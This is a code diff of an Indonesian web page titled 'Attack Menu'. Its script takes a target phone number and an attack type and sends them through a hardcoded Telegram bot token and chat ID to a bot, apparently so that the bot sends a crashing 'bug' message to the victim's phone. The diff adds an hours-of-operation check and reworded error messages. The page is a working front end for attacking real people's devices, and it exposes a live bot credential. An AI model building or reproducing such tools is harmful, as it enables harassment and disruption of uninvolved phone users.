@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Attack Menu SamsInfinity</title>
+  <title>Attack Menu</title>
   <style>
     body {
       background-color: #000;
@@ -118,55 +118,64 @@
     <div id="notifMessage"></div>
   </div>
 
-  <script>
-    function sendBug() {
-      const number = document.getElementById("targetNumber").value.trim();
-      const typeValue = document.getElementById("attackType").value;
-      const typeText = document.getElementById("attackType").options[document.getElementById("attackType").selectedIndex].text;
-      const token = "7432046690:AAFwGypADBwML-2I5xCDNdYeKVE3uenhJxE";
-      const chatId = "-1002532993003";
+<script>
+  function sendBug() {
+    const now = new Date();
+    const hour = now.getHours();
 
-      if (!number.startsWith("62")) {
-        showNotif("❗ Nomor harus diawali dengan 62 tanpa spasi. Contoh: 62812xxxx");
-        return;
+    // Batasi akses hanya dari jam 07.00 - 00.59
+    if (hour < 7 || hour >= 1 && hour <= 6) {
+      showNotif("❌ Maaf, sistem hanya aktif mulai pukul 07.00 hingga 00.59 WIB. Coba lagi nanti.");
+      return;
+    }
+
+    const number = document.getElementById("targetNumber").value.trim();
+    const typeValue = document.getElementById("attackType").value;
+    const typeText = document.getElementById("attackType").options[document.getElementById("attackType").selectedIndex].text;
+    const token = "7432046690:AAFwGypADBwML-2I5xCDNdYeKVE3uenhJxE";
+    const chatId = "-1002532993003";
+
+    if (!number.startsWith("62")) {
+      showNotif("❗ Nomor harus diawali dengan 62 tanpa spasi. Contoh: 62812xxxx");
+      return;
+    }
+
+    const message = `${typeValue} ${number}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        showNotif(`✅ Bug Sedang diproses!, Tunggu 2 menit agar bug berjalan<br>Target: <b>${number}</b><br>Jenis: <b>${typeText}</b><br><small>Harap tunggu 20 menit sebelum mengirim lagi</small>`);
+      } else {
+        showNotif("❗ Maaf, sistem kamu saat ini sedang maintenance alias perawatan server.");
       }
+    })
+    .catch(error => {
+      showNotif("❗ Maaf, sistem kamu saat ini sedang maintenance alias perawatan server.");
+      console.error(error);
+    });
+  }
 
-      const message = `${typeValue} ${number}`;
+  function showNotif(msg) {
+    const notifBox = document.getElementById("notifBox");
+    const notifMessage = document.getElementById("notifMessage");
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => {
-        if (response.ok) {
-          showNotif(`✅ Bug Sedang diproses!, Tunggu 2menit agar bug berjalan<br>Target: <b>${number}</b><br>Jenis: <b>${typeText}</b><br><small>Harap tunggu 20 menit sebelum mengirim lagi</small>`);
-        } else {
-          showNotif("❌ Gagal mengirim ke Telegram.");
-        }
-      })
-      .catch(error => {
-        showNotif("⚠️ Terjadi kesalahan saat mengirim.");
-        console.error(error);
-      });
-    }
+    notifMessage.innerHTML = msg;
+    notifBox.style.display = "block";
+  }
 
-    function showNotif(msg) {
-      const notifBox = document.getElementById("notifBox");
-      const notifMessage = document.getElementById("notifMessage");
-
-      notifMessage.innerHTML = msg;
-      notifBox.style.display = "block";
-    }
-
-    function closeNotif() {
-      document.getElementById("notifBox").style.display = "none";
-    }
-  </script>
+  function closeNotif() {
+    document.getElementById("notifBox").style.display = "none";
+  }
+</script>
 </body>
 </html>
